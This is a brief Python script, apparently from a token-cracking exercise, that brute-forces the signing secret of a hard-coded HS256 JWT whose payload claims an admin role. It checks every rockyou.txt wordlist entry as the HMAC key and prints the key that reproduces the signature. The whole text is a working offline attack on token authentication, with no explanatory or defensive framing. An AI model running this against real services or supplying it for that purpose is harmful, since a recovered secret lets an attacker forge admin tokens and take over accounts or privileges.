import hmac, hashlib, base64
jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4iLCJkZXBhcnRtZW50IjoiY2x1Yl9zZWN1cml0eSIsInJvbGUiOiJhZG1pbiIsImFkbWluX2xldmVsIjoibm9ybWFsIiwiY2xlYXJhbmNlIjoxLCJpYXQiOjE3OTE1MjQ2NzMsImV4cCI6MTc5MTUyODI3M30.WXlilrcs1oirqgJfR8rvpBHMMyfgV5fd21sgGlBkS-U"
header_payload, signature = jwt.rsplit('.', 1)
with open("rockyou.txt", "r", encoding="latin-1") as f:
    for line in f:
        secret = line.strip().encode()
        expected = base64.urlsafe_b64encode(
            hmac.new(secret, header_payload.encode(), hashlib.sha256).digest()
        ).rstrip(b'=')
        if expected.decode() == signature:
            print("FOUND:", secret.decode())
            break